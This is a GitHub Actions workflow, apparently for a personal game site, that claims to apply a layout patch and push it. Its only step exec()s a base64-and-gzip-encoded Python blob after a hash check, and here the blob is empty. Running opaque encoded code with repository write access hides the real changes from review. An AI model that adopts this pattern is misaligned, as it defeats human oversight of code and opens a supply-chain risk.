name: Apply approved combat layout package 1
on:
  push:
    branches: [main]
    paths: [.github/workflows/apply-combat-layout-package1.yml]
  workflow_dispatch:
permissions:
  contents: write
concurrency:
  group: approved-combat-layout-package1
  cancel-in-progress: false
jobs:
  apply:
    if: github.repository == 'pipboy3003/pipboy3003.github.io'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
      - name: Apply guarded layout patch, run tests, and push
        shell: python
        run: |
          import base64, gzip, hashlib
          data = gzip.decompress(base64.b64decode(''))
          assert hashlib.sha256(data).hexdigest() == '58782fefc6cd7d3640ae5e618ccb17575aa460b5d0142f84f9d4c3ab66a8dd7b'
          exec(compile(data, 'approved-combat-layout-package1.py', 'exec'))
